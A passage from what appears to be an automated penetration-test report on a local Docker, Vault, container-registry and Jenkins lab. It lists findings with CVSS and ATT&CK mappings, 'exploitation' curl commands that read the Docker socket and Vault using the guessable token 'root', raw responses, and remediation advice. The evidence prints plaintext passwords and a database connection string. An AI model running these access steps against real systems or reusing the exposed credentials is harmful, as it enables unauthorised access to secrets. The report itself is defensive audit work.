### 3.25 — Secrets Permanently Visible in Image Config Build History

| Field | Value |
|-------|-------|
| **ID** | `vuln_61286d` |
| **Severity** | HIGH |
| **CVSS Score** | 7.5 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **Status** | CONFIRMED |
| **Category** | `credential_exposure` |
| **MITRE ATT&CK** | `T1552.001` — Unsecured Credentials: Credentials In Files |
| **ISO 27001** | `A.5.33 - Protection of Records` |
| **Endpoint** | `http://127.0.0.1:[REDACTED]:69553fa838ed` |
| **Component** | corp/backend:latest image config |
| **Discovered by** | `container-registry` |
| **Discovered at** | 2026-08-01T19:39:01Z |

#### Description

The image config blob (sha256:69553fa838ed) for corp/backend:latest contains full build history with RUN commands that include both the PostgreSQL DSN and AWS secret key in cleartext. These secrets persist in metadata even if layers are squashed or files are deleted in subsequent layers.

#### Exploitation Commands

```bash
curl --connect-timeout 10 -m 30 http://127.0.0.1:[REDACTED]:69553fa838ed
```

#### Evidence / Logs

```
history[2].created_by: RUN /bin/sh -c mkdir -p /app && echo "AWS_SECRET_ACCESS_KEY=[REDACTED]" > /app/.env && echo "db=postgres://admin:S3cr3t@db/prod" >> /app/.env
```

#### Remediation

Use multi-stage builds. Use --mount=type=secret for build-time secrets. Rebuild the image from scratch to purge history. Implement image scanning in CI/CD.

---

### 3.26 — Multiple Database Credentials Exposed in Container Environment Variables

| Field | Value |
|-------|-------|
| **ID** | `vuln_036872` |
| **Severity** | HIGH |
| **CVSS Score** | 7.5 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **Status** | CONFIRMED |
| **Category** | `credential_exposure` |
| **MITRE ATT&CK** | `T1552.001` — Unsecured Credentials: Credentials In Files |
| **ISO 27001** | `A.5.17 - Authentication Information` |
| **Endpoint** | `unix:///var/run/docker.sock → multiple database containers` |
| **Component** | PostgreSQL/MySQL containers |
| **Discovered by** | `docker` |
| **Discovered at** | 2026-08-01T19:40:25Z |

#### Description

Multiple containers expose database credentials as plaintext environment variables: dm-postgres (POSTGRES_PASSWORD=postgres), moodle-ci-db (POSTGRES_PASSWORD=moodlepass, POSTGRES_USER=moodle), moodle-test-db-1 (POSTGRES_PASSWORD=moodlepass), vulnapp-mysql (MYSQL_ROOT_PASSWORD=rootwolf on EOL MySQL 5.6 published on 0.0.0.0:3306).

#### Exploitation Commands

```bash
curl --unix-socket /var/run/docker.sock http://localhost/containers/json?all=true
# Inspected dm-postgres, moodle-ci-db, moodle-test-db-1, vulnapp-mysql containers
```

#### Evidence / Logs

```
dm-postgres: POSTGRES_PASSWORD=postgres, POSTGRES_USER=postgres (host network)
moodle-ci-db: POSTGRES_PASSWORD=moodlepass, POSTGRES_USER=moodle, POSTGRES_DB=moodle
moodle-test-db-1: POSTGRES_PASSWORD=moodlepass, POSTGRES_USER=moodle
vulnapp-mysql: MYSQL_ROOT_PASSWORD=rootwolf (MySQL 5.6 EOL, port 3306 on 0.0.0.0)
```

#### Remediation

Use Docker secrets or environment files (not env vars) for database credentials. Use unique, strong passwords per environment. Upgrade MySQL 5.6 to a supported version. Restrict port publishing to specific interfaces.

---

### 3.27 — Moodle Admin Credentials and SMTP Config Exposed in Container Environment

| Field | Value |
|-------|-------|
| **ID** | `vuln_6c556e` |
| **Severity** | HIGH |
| **CVSS Score** | 7.5 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **Status** | CONFIRMED |
| **Category** | `credential_exposure` |
| **MITRE ATT&CK** | `T1552.001` — Unsecured Credentials: Credentials In Files |
| **ISO 27001** | `A.5.17 - Authentication Information` |
| **Endpoint** | `unix:///var/run/docker.sock → /moodle-test-moodle-1 container env` |
| **Component** | Moodle container |
| **Discovered by** | `docker` |
| **Discovered at** | 2026-08-01T19:40:33Z |

#### Description

The Moodle application container (moodle-test-moodle-1) exposes admin credentials (MOODLE_USERNAME=admin, MOODLE_PASSWORD=Admin12345!), database credentials (DB_USER=moodle, DB_PASS=moodlepass), and SMTP configuration (SMTP_HOST=smtp.gmail.com, SMTP_USER/PASSWORD) as plaintext environment variables.

#### Evidence / Logs

```
MOODLE_USERNAME=admin, MOODLE_PASSWORD=Admin12345!, MOODLE_EMAIL=admin@moodle.local
DB_USER=moodle, DB_PASS=moodlepass
SMTP_HOST=smtp.gmail.com, SMTP_PORT=587, SMTP_USER=moodletest@gmail.com
```

#### Remediation

Use Docker secrets for all credentials. Avoid storing SMTP credentials in environment variables.

---

### 3.28 — Kubernetes Config Mounted into Containers — Cluster Credential Exposure

| Field | Value |
|-------|-------|
| **ID** | `vuln_a2be41` |
| **Severity** | HIGH |
| **CVSS Score** | 7.5 |
| **CVSS Vector** | `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N` |
| **Status** | CONFIRMED |
| **Category** | `credential_exposure` |
| **MITRE ATT&CK** | `T1552.001` — Unsecured Credentials: Credentials In Files |
| **ISO 27001** | `A.5.17 - Authentication Information` |
| **Endpoint** | `unix:///var/run/docker.sock → container bind mounts` |
| **Component** | Docker bind mounts |
| **Discovered by** | `docker` |
| **Discovered at** | 2026-08-01T19:40:46Z |

#### Description

Both /darkmoon and /opencode containers have the host user's ~/.kube directory bind-mounted (containing Kubernetes cluster configuration and credentials). Any escape from these containers also compromises the Kubernetes cluster.

#### Evidence / Logs

```
/darkmoon: /home/mehdi/.kube:/root/.kube:ro
/opencode: /run/desktop/.../adf784...:/root/.kube:ro
```

#### Remediation

Do not mount kubeconfig into containers. Use Kubernetes service accounts and RBAC instead.

---

### 3.29 — TLS Disabled on Vault Listener — Cleartext HTTP API

| Field | Value |
|-------|-------|
| **ID** | `vuln_2e815d` |
| **Severity** | HIGH |
| **CVSS Score** | 7.4 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N` |
| **Status** | CONFIRMED |
| **Category** | `insecure_transport` |
| **MITRE ATT&CK** | `T1557` — Adversary-in-the-Middle |
| **ISO 27001** | `A.13.1.1` |
| **Endpoint** | `http://127.0.0.1:[REDACTED]` |
| **Component** | Vault TCP Listener |
| **Discovered by** | `vault` |
| **Discovered at** | 2026-08-01T19:34:30Z |

#### Description

The Vault listener is configured with tls_disable=true, meaning all API traffic including authentication tokens and secrets is transmitted in cleartext HTTP. The sys/config/state/sanitized endpoint confirms listeners[0].config.tls_disable=true. Any network-level attacker (MITM, packet sniffer) can intercept Vault tokens, secrets, and administrative commands in transit. This is confirmed by the sanitized configuration and the fact that all API calls succeed over plain HTTP.

#### Technical Analysis

The Vault instance's sanitized configuration reveals that the TCP listener has TLS explicitly disabled (tls_disable: true). All communication between clients and the Vault API occurs over unencrypted HTTP, exposing authentication tokens (including the root token), secret values, and administrative commands to any entity that can observe network traffic. This is especially dangerous in non-loopback network environments where the listener binds to a real network interface (as indicated by the IP_PRIVATE_003 address in the config).

#### Exploitation Commands

```bash
curl -s --connect-timeout 10 -m 30 -H "X-Vault-Token: root" http://127.0.0.1:[REDACTED] | jq '.data.listeners'
```

#### Raw Request

```http
GET /v1/sys/config/state/sanitized HTTP/1.1\nHost: 127.0.0.1:8200\nX-Vault-Token: root
```

#### Raw Response

```http
{"data":{"listeners":[{"config":{"address":"IP_PRIVATE_003:8200","proxy_protocol_authorized_addrs":"IP_PRIVATE_003:8200","proxy_protocol_behavior":"allow_authorized","tls_disable":true},"type":"tcp"}],"disable_mlock":true,"enable_ui":true,"storage":{"type":"inmem"}}}
```

#### Evidence / Logs

```
sys/config/state/sanitized -> listeners: [{"config":{"address":"IP_PRIVATE_003:8200","tls_disable":true,"proxy_protocol_behavior":"allow_authorized"},"type":"tcp"}]
```

#### Remediation

1. Enable TLS on the Vault listener with a valid certificate: listener tcp { tls_cert_file, tls_key_file }. 2. Use TLS 1.2+ with strong cipher suites. 3. Consider using mutual TLS (mTLS) for client authentication. 4. If running in a service mesh, ensure the sidecar provides encryption.

---

### 3.30 — TLS Disabled — All Vault Traffic in Cleartext

| Field | Value |
|-------|-------|
| **ID** | `vuln_421098` |
| **Severity** | HIGH |
| **CVSS Score** | 7.4 |
| **CVSS Vector** | `CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` |
| **Status** | CONFIRMED |
| **Category** | `misconfiguration` |
| **MITRE ATT&CK** | `T1557` — Adversary-in-the-Middle |
| **ISO 27001** | `A.8.24 - Use of Cryptography` |
| **Endpoint** | `http://127.0.0.1:[REDACTED]` |
| **Component** | Vault TLS Configuration |
| **Discovered by** | `hashicorp-vault` |
| **Discovered at** | 2026-08-01T19:37:40Z |

#### Description

Vault listener has tls_disable=true. All tokens, secrets, and API requests are transmitted in plaintext. A network-positioned attacker can intercept root tokens, extracted secrets, and any other sensitive data.

#### Technical Analysis

TLS is disabled, exposing all Vault communications (including root token headers and secret values) to network interception.

#### Exploitation Commands

```bash
curl --connect-timeout 10 -m 30 -H "X-Vault-Token: root" http://127.0.0.1:[REDACTED]
```

#### Evidence / Logs

```
listeners[0].config.tls_disable = true
Vault accessible over HTTP (not HTTPS)
```

#### Remediation

Enable TLS with proper certificates. Configure tls_cert_file and tls_key_file. Set tls_min_version to tls13. Redirect HTTP to HTTPS.

---

### 3.31 — Multiple Containers Running with Host Network Mode — No Network Isolation

| Field | Value |
|-------|-------|
| **ID** | `vuln_d8952b` |
| **Severity** | MEDIUM |
| **CVSS Score** | 6.5 |
| **CVSS Vector** | `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N` |
| **Status** | CONFIRMED |
| **Category** | `misconfiguration` |
| **MITRE ATT&CK** | `T1610` — Deploy Container |
| **ISO 27001** | `A.8.22 - Segregation of Networks` |
| **Endpoint** | `unix:///var/run/docker.sock → multiple containers` |
| **Component** | Docker Engine networking |
| **Discovered by** | `docker` |
| **Discovered at** | 2026-08-01T19:40:40Z |

#### Description

8+ containers run with NetworkMode=host, sharing the host's full network namespace. This eliminates container network isolation, allows containers to bind to any host port, and access all host network services including loopback. Affected: dm-vault, dm-postgres, dm-localstack, dm-jenkins, dm-ansible, dm-tfstate, dm-redis, dm-registry, darkmoon.

#### Remediation

Use bridge networks with explicit port publishing. Only use host networking when absolutely required and with compensating controls.

---

### 3.32 — Jenkins Running with Setup Wizard Disabled — Unauthenticated Access

| Field | Value |
|-------|-------|
| **ID** | `vuln_4a33e2` |
| **Severity** | MEDIUM |
| **CVSS Score** | 6.5 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N` |
| **Status** | CONFIRMED |
| **Category** | `misconfiguration` |
| **MITRE ATT&CK** | `T1190` — Exploit Public-Facing Application |
| **ISO 27001** | `A.8.5 - Secure Authentication` |
| **Endpoint** | `unix:///var/run/docker.sock → /dm-jenkins container` |
| **Component** | Jenkins |
| **Discovered by** | `docker` |
| **Discovered at** | 2026-08-01T19:40:52Z |

#### Description

The Jenkins container (dm-jenkins) runs with -Djenkins.install.runSetupWizard=false, bypassing security setup. Combined with host networking, Jenkins is accessible without authentication on the host network.

#### Evidence / Logs

```
JAVA_OPTS=-Djenkins.install.runSetupWizard=false, NetworkMode=host
```

#### Remediation

Enable the setup wizard. Configure authentication and authorization strategy. Use bridge networking with explicit port publishing.

---

### 3.33 — In-Memory Storage Backend — No Persistence, No HA, Data Loss on Restart

| Field | Value |
|-------|-------|
| **ID** | `vuln_f36f94` |
| **Severity** | MEDIUM |
| **CVSS Score** | 5.9 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| **Status** | CONFIRMED |
| **Category** | `insecure_configuration` |
| **MITRE ATT&CK** | `T1485` — Data Destruction |
| **ISO 27001** | `A.17.1.1` |
| **Endpoint** | `http://127.0.0.1:[REDACTED]` |
| **Component** | Vault Storage Backend |
| **Discovered by** | `vault` |
| **Discovered at** | 2026-08-01T19:35:03Z |

#### Description

The Vault instance uses an in-memory (inmem) storage backend, as confirmed by both sys/seal-status (storage_type: inmem) and sys/config/state/sanitized (storage.type: inmem). All secrets, tokens, policies, and configuration are stored only in RAM and will be permanently lost on process restart. This is a dev-mode configuration unsuitable for production. Additionally, in-memory storage does not support high availability (HA), meaning a single server failure results in complete Vault unavailability and total data loss.

#### Technical Analysis

The Vault uses in-memory storage which is a volatile, non-persistent backend. All data including secrets, policies, tokens, and configuration exists only in the process's RAM. A process restart, crash, or host reboot will result in permanent loss of all Vault data. This configuration is characteristic of Vault running in dev mode (vault server -dev) which is explicitly documented as unsuitable for production. The inmem backend also lacks HA support, meaning no clustering or failover is possible.

#### Exploitation Commands

```bash
curl -s --connect-timeout 10 -m 30 http://127.0.0.1:8200/v1/sys/seal-status | jq '.storage_type'\ncurl -s --connect-timeout 10 -m 30 -H "X-Vault-Token: root" http://127.0.0.1:[REDACTED] | jq '.data.storage'
```

#### Raw Request

```http
GET /v1/sys/seal-status HTTP/1.1\nHost: 127.0.0.1:8200
```

#### Raw Response

```http
{"type":"shamir","initialized":true,"sealed":false,"t":1,"n":1,"storage_type":"inmem"}
```

#### Evidence / Logs

```
sys/seal-status -> storage_type: inmem\nsys/config/state/sanitized -> storage: {"type":"inmem","cluster_addr":"","disable_clustering":false,"redirect_addr":""}
```

#### Remediation

1. Migrate to a persistent storage backend: Integrated Raft (recommended), Consul, or cloud-managed storage. 2. Implement HA with at least 3 Vault nodes in a Raft cluster. 3. Configure regular backup snapshots of the storage backend. 4. Never use dev mode or in-memory storage in production.

---

### 3.34 — Registry Serves Over Plaintext HTTP Without TLS Encryption

| Field | Value |
|-------|-------|
| **ID** | `vuln_2058f7` |
| **Severity** | MEDIUM |
| **CVSS Score** | 5.9 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **Status** | CONFIRMED |
| **Category** | `misconfiguration` |
| **MITRE ATT&CK** | `T1557` — Adversary-in-the-Middle |
| **ISO 27001** | `A.10.1.1 Policy on the use of cryptographic controls` |
| **Endpoint** | `http://127.0.0.1:5000/v2/` |
| **Component** | Docker Distribution Registry v2 |
| **Discovered by** | `container-registry` |
| **Discovered at** | 2026-08-01T19:36:01Z |

#### Description

The Docker Registry v2 is accessible over plaintext HTTP (http://127.0.0.1:5000) without TLS encryption. All API traffic including image manifests, config blobs, layer content, and any authentication tokens (if auth were enabled) traverse the network unencrypted. This enables man-in-the-middle attacks where an attacker on the network path could intercept image pulls/pushes, extract secrets from blobs in transit, or inject malicious content. The registry's Docker-Distribution-Api-Version header confirms it is serving the v2 API over the unencrypted HTTP connection.

#### Technical Analysis

The registry is accessible at http://127.0.0.1:5000 (plaintext HTTP) and serves the full Docker Distribution v2 API without TLS encryption. The response headers show no TLS-related headers (Strict-Transport-Security), and the Location header in the push upload response also uses the HTTP scheme. In a production environment, this means all image data and any credentials pass unencrypted over the network, enabling passive eavesdropping and active MITM attacks.

#### Exploitation Commands

```bash
curl -s -i http://127.0.0.1:5000/v2/
```

#### Raw Request

```http
GET /v2/ HTTP/1.1
Host: 127.0.0.1:5000
```

#### Raw Response

```http
HTTP/1.1 200 OK
Content-Length: 2
Content-Type: application/json; charset=utf-8
Docker-Distribution-Api-Version: registry/2.0
X-Content-Type-Options: nosniff
{}
```

#### Evidence / Logs

```
HTTP/1.1 200 OK — registry responds on plaintext HTTP port 5000
Docker-Distribution-Api-Version: registry/2.0
No TLS, no HTTPS redirect, no HSTS header
```

#### Remediation

1. Enable TLS on the registry by configuring certificates (Let's Encrypt or internal CA). 2. Place the registry behind a TLS-terminating reverse proxy (nginx, Traefik, HAProxy). 3. Redirect all HTTP traffic to HTTPS. 4. Add HSTS headers to prevent downgrade attacks. 5. Configure Docker clients to refuse insecure registries (remove --insecure-registry flag).

---

### 3.35 — In-Memory Storage Backend — No Persistence, No HA

| Field | Value |
|-------|-------|
| **ID** | `vuln_0ef361` |
| **Severity** | MEDIUM |
| **CVSS Score** | 5.9 |
| **CVSS Vector** | `N/A` |
| **Status** | CONFIRMED |
| **Category** | `misconfiguration` |
| **MITRE ATT&CK** | `T1485` — Data Destruction |
| **ISO 27001** | `A.8.13 - Information Backup` |
| **Endpoint** | `http://127.0.0.1:[REDACTED]` |
| **Discovered by** | `hashicorp-vault` |
| **Discovered at** | 2026-08-01T19:38:00Z |

#### Description

Vault uses in-memory (inmem) storage backend. All secrets and configuration are lost on restart. There is no high availability, no persistence, and no backup capability. This confirms dev mode operation.

#### Exploitation Commands

```bash
curl --connect-timeout 10 -m 30 -H "X-Vault-Token: root" http://127.0.0.1:[REDACTED]
```

#### Evidence / Logs

```
storage_type: inmem
```

#### Remediation

Use a persistent storage backend (Consul, Raft, PostgreSQL). Configure regular backups. Enable HA for production.

---

### 3.36 — Container Registry Serves Over Plaintext HTTP Without TLS

| Field | Value |
|-------|-------|
| **ID** | `vuln_0f8405` |
| **Severity** | MEDIUM |
| **CVSS Score** | 5.9 |
| **CVSS Vector** | `CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **Status** | CONFIRMED |
| **Category** | `misconfiguration` |
| **MITRE ATT&CK** | `T1557` — Adversary-in-the-Middle |
| **ISO 27001** | `A.8.24 - Use of Cryptography` |
| **Endpoint** | `http://127.0.0.1:5000/v2/` |
| **Component** | Docker Registry v2 |
| **Discovered by** | `container-registry` |
| **Discovered at** | 2026-08-01T19:39:07Z |

#### Description

The registry at port 5000 responds on HTTP with no HTTPS redirect or HSTS headers. All traffic including images, secrets in layers, and any authentication tokens is transmitted in cleartext, enabling MITM interception.

#### Remediation

Enable TLS on the registry with proper certificates. Configure HSTS. Redirect HTTP to HTTPS.

---

### 3.37 — Unauthenticated Information Disclosure via sys/health, sys/seal-status, sys/init

| Field | Value |
|-------|-------|
| **ID** | `vuln_e1e70f` |
| **Severity** | MEDIUM |
| **CVSS Score** | 5.3 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` |
| **Status** | CONFIRMED |
| **Category** | `information_disclosure` |
| **MITRE ATT&CK** | `T1592.004` — Gather Victim Host Information: Client Configurations |
| **ISO 27001** | `A.14.1.2` |
| **Endpoint** | `http://127.0.0.1:8200/v1/sys/health` |
| **Component** | Vault System API |
| **Discovered by** | `vault` |
| **Discovered at** | 2026-08-01T19:35:30Z |

#### Description

Three Vault API endpoints respond to unauthenticated requests and disclose sensitive deployment information: (1) sys/health reveals version (2.0.3), cluster name/ID, sealed state, standby status, and replication mode; (2) sys/seal-status reveals seal type (shamir), key threshold (1/1), storage type (inmem), build date, and cluster details; (3) sys/init reveals initialization status. This information assists an attacker in fingerprinting the deployment and planning targeted attacks. While these endpoints are designed to be unauthenticated for health-check purposes, the information disclosed (especially storage_type, seal parameters, and version) provides excessive detail.

#### Technical Analysis

The Vault API exposes three unauthenticated endpoints that disclose deployment metadata. sys/health reveals the exact version (2.0.3), cluster name (vault-cluster-78ea103f), and cluster ID. sys/seal-status reveals the seal type (shamir), key threshold (1/1), storage type (inmem), and build date. sys/init confirms initialization status. While these are intentionally unauthenticated by Vault design for load balancer health checks, in a hardened deployment these should be restricted to authorized monitoring systems or configured to return only status codes without detailed JSON bodies.

#### Exploitation Commands

```bash
curl -s --connect-timeout 10 -m 30 http://127.0.0.1:8200/v1/sys/health | jq .\ncurl -s --connect-timeout 10 -m 30 http://127.0.0.1:8200/v1/sys/seal-status | jq .\ncurl -s --connect-timeout 10 -m 30 http://127.0.0.1:8200/v1/sys/init | jq .
```

#### Raw Request

```http
GET /v1/sys/health HTTP/1.1\nHost: 127.0.0.1:8200\n(No X-Vault-Token header)
```

#### Raw Response

```http
{"initialized":true,"sealed":false,"standby":false,"performance_standby":false,"replication_performance_mode":"disabled","replication_dr_mode":"disabled","server_time_utc":1785612753,"version":"2.0.3","enterprise":false,"cluster_name":"vault-cluster-78ea103f","cluster_id":"87984de1-9662-10bf-27dc-5fb2d3e1b41b"}
```

#### Evidence / Logs

```
All three endpoints returned valid JSON with deployment details without requiring any authentication token.
```

#### Remediation

1. Place the Vault API behind a reverse proxy that restricts access to sys/health, sys/seal-status, sys/init to authorized monitoring IPs only. 2. Use network-level ACLs to limit who can reach the Vault API. 3. Consider returning only HTTP status codes for health checks rather than full JSON responses.

---

### 3.38 — Unauthenticated Information Disclosure — Vault Version and Cluster Details

| Field | Value |
|-------|-------|
| **ID** | `vuln_c5b727` |
| **Severity** | MEDIUM |
| **CVSS Score** | 5.3 |
| **CVSS Vector** | `N/A` |
| **Status** | CONFIRMED |
| **Category** | `information_disclosure` |
| **MITRE ATT&CK** | `T1592` — Gather Victim Host Information |
| **ISO 27001** | `A.8.9 - Configuration Management` |
| **Endpoint** | `http://127.0.0.1:8200/v1/sys/health` |
| **Discovered by** | `hashicorp-vault` |
| **Discovered at** | 2026-08-01T19:38:08Z |

#### Description

Vault endpoints sys/health, sys/seal-status, and sys/init are accessible without authentication, revealing version (2.0.3), cluster name, seal type, initialization status, and cluster ID. This aids attackers in fingerprinting and identifying version-specific vulnerabilities.

#### Exploitation Commands

```bash
curl --connect-timeout 10 -m 30 http://127.0.0.1:8200/v1/sys/health
curl --connect-timeout 10 -m 30 http://127.0.0.1:8200/v1/sys/seal-status
curl --connect-timeout 10 -m 30 http://127.0.0.1:8200/v1/sys/init
```

#### Evidence / Logs

```
sys/health: version=2.0.3, cluster_name=vault-cluster-b6261e1f, initialized=true, sealed=false
sys/seal-status: type=shamir, shares=1, threshold=1
sys/init: initialized=true
```

#### Remediation

Restrict access to health and status endpoints via network controls. Consider using a reverse proxy to limit exposure.

---

### 3.39 — Memory Locking Disabled (disable_mlock=true) — Secrets May Swap to Disk

| Field | Value |
|-------|-------|
| **ID** | `vuln_0f7e7d` |
| **Severity** | MEDIUM |
| **CVSS Score** | 4.7 |
| **CVSS Vector** | `CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N` |
| **Status** | CONFIRMED |
| **Category** | `insecure_configuration` |
| **MITRE ATT&CK** | `T1005` — Data from Local System |
| **ISO 27001** | `A.10.1.1` |
| **Endpoint** | `http://127.0.0.1:[REDACTED]` |
| **Component** | Vault Server Configuration |
| **Discovered by** | `vault` |
| **Discovered at** | 2026-08-01T19:35:43Z |

#### Description

The Vault configuration has disable_mlock=true as confirmed by sys/config/state/sanitized. When mlock is disabled, the operating system's virtual memory manager may swap Vault's process memory to disk. Since Vault holds sensitive data (encryption keys, unsealed master key, secrets) in memory, these could be written to disk swap partitions where they persist beyond process termination and can be recovered by an attacker with disk access.

#### Technical Analysis

The Vault server configuration has memory locking disabled (disable_mlock=true). The mlock system call prevents the operating system from swapping a process's memory to disk. With mlock disabled, Vault's in-memory secrets — including the master key, encryption keys, and plaintext secret values being processed — can be written to disk swap space. An attacker with access to the host's disk or swap partition could recover these sensitive values even after Vault has been stopped. This is particularly concerning in containerized environments where swap may be shared.

#### Exploitation Commands

```bash
curl -s --connect-timeout 10 -m 30 -H "X-Vault-Token: root" http://127.0.0.1:[REDACTED] | jq '.data.disable_mlock'
```

#### Raw Request

```http
GET /v1/sys/config/state/sanitized HTTP/1.1\nHost: 127.0.0.1:8200\nX-Vault-Token: root
```

#### Raw Response

```http
{"data":{"disable_mlock":true}}
```

#### Evidence / Logs

```
sys/config/state/sanitized -> disable_mlock: true
```

#### Remediation

1. Set disable_mlock=false in the Vault configuration. 2. Grant the vault process CAP_IPC_LOCK capability: setcap cap_ipc_lock=+ep $(readlink -f /usr/bin/vault). 3. Alternatively, disable swap entirely on the Vault host. 4. In containers, ensure the container runtime supports mlock (--cap-add IPC_LOCK).

---

### 3.40 — Vault UI Enabled — Increases Attack Surface

| Field | Value |
|-------|-------|
| **ID** | `vuln_c6b7b8` |
| **Severity** | LOW |
| **CVSS Score** | 3.7 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N` |
| **Status** | CONFIRMED |
| **Category** | `insecure_configuration` |
| **MITRE ATT&CK** | `T1133` — External Remote Services |
| **ISO 27001** | `A.13.1.3` |
| **Endpoint** | `http://127.0.0.1:8200/ui/` |
| **Component** | Vault Web UI |
| **Discovered by** | `vault` |
| **Discovered at** | 2026-08-01T19:35:14Z |

#### Description

The Vault Web UI is enabled (enable_ui=true in sys/config/state/sanitized). While the UI requires authentication, it increases the attack surface by providing a browser-based interface that is susceptible to browser-based attacks (XSS, CSRF) and makes it easier for an attacker with a stolen token to browse and interact with Vault interactively. Combined with the trivially guessable root token and TLS disabled, any network-adjacent attacker can access the full Vault UI with root privileges.

#### Technical Analysis

The Vault configuration has the web UI enabled. While the UI itself requires authentication, it expands the attack surface by providing a visual interface for secret management. Combined with the exposed root token and disabled TLS, an attacker can access the full Vault UI with administrative privileges through a web browser, making it trivial to browse, read, and modify all secrets and configuration.

#### Exploitation Commands

```bash
curl -s --connect-timeout 10 -m 30 -H "X-Vault-Token: root" http://127.0.0.1:[REDACTED] | jq '.data.enable_ui'
```

#### Raw Request

```http
GET /v1/sys/config/state/sanitized HTTP/1.1\nHost: 127.0.0.1:8200\nX-Vault-Token: root
```

#### Raw Response

```http
{"data":{"enable_ui":true}}
```

#### Evidence / Logs

```
sys/config/state/sanitized -> enable_ui: true
```

#### Remediation

1. Disable the UI in production if not needed: ui = false in Vault config. 2. If UI is required, restrict access via network-level controls (firewall rules, VPN). 3. Ensure TLS is enabled when UI is accessible.

---

### 3.41 — SLSA Provenance Attestation Leaks Internal Infrastructure Hostname

| Field | Value |
|-------|-------|
| **ID** | `vuln_3eb659` |
| **Severity** | LOW |
| **CVSS Score** | 3.7 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N` |
| **Status** | CONFIRMED |
| **Category** | `information_disclosure` |
| **MITRE ATT&CK** | `T1590.004` — Gather Victim Network Information: Network Topology |
| **ISO 27001** | `A.12.6.1 Management of technical vulnerabilities` |
| **Endpoint** | `http://127.0.0.1:[REDACTED]:abedfa79ae19e5f5cc6...` |
| **Component** | SLSA Provenance Attestation |
| **Discovered by** | `container-registry` |
| **Discovered at** | 2026-08-01T19:35:42Z |

#### Description

The SLSA provenance attestation manifest attached to corp/backend:latest contains an in-toto Statement that reveals the internal registry hostname in the subject field: 'pkg:docker/IP_PRIVATE_003%3A5000/corp/backend@latest'. This leaks the internal IP address (IP_PRIVATE_003) of the registry host, which aids network reconnaissance. The attestation also reveals build metadata including the build invocation ID, build start/finish timestamps, and that the image was built using BuildKit with a Dockerfile frontend.

#### Technical Analysis

The SLSA v0.2 provenance attestation is stored as an in-toto Statement blob attached via an attestation manifest. It exposes the internal registry IP (encoded as IP_PRIVATE_003) in the purl subject, build timestamps, and the build system details. While this is informational, it aids an attacker in mapping internal infrastructure and understanding the CI/CD pipeline used to build the image. The attestation is anonymously accessible via the same unauthenticated blob pull mechanism.

#### Exploitation Commands

```bash
curl -s http://127.0.0.1:[REDACTED]:abedfa79ae19e5f5cc66d562aecb9cf4a3cd68b950c8cf8e25191efb1db5a5e1
```

#### Raw Request

```http
GET /v2/corp/backend/blobs/sha256:abedfa79ae19e5f5cc66d562aecb9cf4a3cd68b950c8cf8e25191efb1db5a5e1 HTTP/1.1
Host: 127.0.0.1:5000
```

#### Raw Response

```http
{"_type":"https://in-toto.io/Statement/v0.1","predicateType":"https://slsa.dev/provenance/v0.2","subject":[{"name":"pkg:docker/IP_PRIVATE_003%3A5000/corp/backend@latest","digest":{"sha256":"77958b835130cbe73d3b96f71f0bf4d3ab15d3ffed571b2eb5dfdd1738737b49"}}],"predicate":{"builder":{"id":""},"buildType":"https://mobyproject.org/buildkit@v1","materials":[{"uri":"pkg:docker/alpine@3.19?platform=linux%2Famd64","digest":{"sha256":"6baf43584bcb78f2e5847d1de515f23499913ac9f12bdf834811a3145eb11ca1"}}],"invocation":{"configSource":{"entryPoint":"Dockerfile"},"parameters":{"frontend":"dockerfile.v0","lo
```

#### Evidence / Logs

```
Attestation subject: "name":"pkg:docker/IP_PRIVATE_003%3A5000/corp/backend@latest"
Build invocation ID: piagg28pln6vt6u0og7porkd8
Build started: 2026-08-01T17:00:36.322466854Z
Build finished: 2026-08-01T17:00:39.735521701Z
Builder type: https://mobyproject.org/buildkit@v1
Dockerfile entrypoint confirmed
```

#### Remediation

1. If the SLSA attestation is not consumed by any verification system, consider removing it from public/unauthenticated access. 2. Sanitize internal hostnames and IP addresses from attestation metadata before publishing. 3. Restrict attestation access to the same authorization level as the image itself.

---

## 4. REMEDIATION ROADMAP

### P0 — Immediate (< 24h)

| Finding | Effort |
|---------|--------|
| Root Token with Trivially Guessable Value "root" | High |
| Root Token with Trivially Guessable Value "root" — Full Vaul... | High |
| Unauthenticated Docker Engine API — Full Host Root Equivalen... | High |
| Docker Socket Mounted into Running Containers — Direct Escap... | High |
| Production Secrets Extracted from KV v2 Engine (AWS Key + DB... | High |
| Hardcoded AWS Secret Access Key Exposed in Image Layer (corp... | High |

### P1 — Short term (< 1 week)

| Finding | Effort |
|---------|--------|
| Vault Dev Root Token Exposed in Container Environment Variab... | High |
| API Keys Exposed in Container Environment Variables (Anthrop... | High |
| Unauthenticated Docker Registry — Full Anonymous Read Access... | High |
| No Audit Devices Enabled — All Vault Operations Unlogged | High |
| Shamir Seal with Single Key Share (Threshold 1/1) — No Split... | High |
| Secrets Permanently Visible in Image Config Build History | High |

### P2 — Medium term (< 2 weeks)

| Finding | Effort |
|---------|--------|
| Multiple Containers Running with Host Network Mode — No Netw... | High |
